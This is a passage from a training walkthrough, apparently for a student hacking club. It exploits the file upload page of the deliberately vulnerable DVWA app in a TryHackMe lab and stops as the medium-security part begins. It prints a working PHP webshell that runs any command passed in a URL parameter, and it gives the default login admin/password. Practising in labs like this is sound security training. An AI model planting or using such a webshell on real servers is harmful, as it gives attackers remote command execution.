# HackerFrogs AfterSchool Network Hacking Session 8
## Session Topic: File Upload Attacks /w TryHackMe
# Challenge 1: TryHackMe DVWA Hash Room
## TryHackMe Link
https://tryhackme.com/room/dvwa
### YouTube Walkthrough Link
https://youtu.be/8mAh2ZGSvV0?t=1190
### Method of Solve
* Step 1: Click on the Task 1 header in the TryHackMe page, then click on the green "Start Machine" button
* Step 2: go to the top of the webpage, and click on the "Start AttackBox" button
* Step 3: wait 2 minutes for the AttackBox to finish loading
* Step 4: after the AttackBox finishes loading, at the bottom-middle of the TryHackMe webpage click on the "View in full screen" button, which looks like two arrows pointing away from each other
* Step 5: in the AttackBox desktop, click on the terminal shortcut button (at the top of the desktop) to open a terminal
* Step 6: in the AttackBox desktop, click on the orange Firefox (at the top of the desktop) to open a web browser
## Part 1: Logging in and setting up the DVWA app
Log into the DVWA app on the AttackBox web browser and configure its settings
* Step 1: In the TryHackMe webpage, note the IP address in the Target Machine Information header. We'll refering to that as the `<IP_address>`
* Step 2: In the AttackBox web browser, browse to the following URL `http://<IP_address>`
* Step 3: In the resulting login page, login to the app using the username `admin` and password `password`
* Step 4: Once logged in, click on the `DVWA Security` button located on the left-side menu (4th button from the bottom)
* Step 5: Then, click on the the drop-down menu located above the `PHPIDS` header. It's initially set to `impossible`, and set it to `low`, then click on the `Submit` button
* Step 6: Finally, in the left-side menu, click on the `File Upload` button to go to the low-level File Upload section of the site
## Part 2: Solving the low-level File Upload webpage
In this section, we'll be walking through how to perform a file upload attack on a webpage with arbitrary file upload vulnerability.
* Step 1: Prepare a malicious PHP file. In the AttackBox terminal, start the nano text editor with the following command:
```
nano webshell.php
```
* Step 2: In the text editor, put input the following PHP code:
```
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```
* Step 3: Save the file by using the `ctrl+x` keyboard shortcut, then `y`, then the `enter` key
* Step 4: On the DVWA web app, click on the `Browse` button and select the `webshell.php` file, then click on `Open` (the file should be in the /root directory)
* Step 5: Confirm the upload by clicking on the `Upload` button
* Step 6: Navigate to the following endpoint in the app `/hackable/uploads/webshell.php`, as in http://<IP_address>/hackable/uploads/webshell.php
You should see a blank page. This is normal. We can run command through the URL's parameters
* Step 7: On the end of the webpage's URL, add this to the end: `?cmd=whoami`
If the webshell is working, you should see the output `www-data`
* Step 8: From here, we can run any commands we want on the uploaded webshell, substituting out `whoami` with any regular Linux command
## Part 3: Uploading a malicious file on the DVWA medium security File Upload page
* Step 1: In the DVWA left-side menu, click on the `DVWA Security` button
* Step 2: In the drop-down menu, change the `low` setting to `medium`, then click `Submit`
* Step 3: In the left-side menu, click on the `File Upload` button to go to the low-level File Upload section of the site
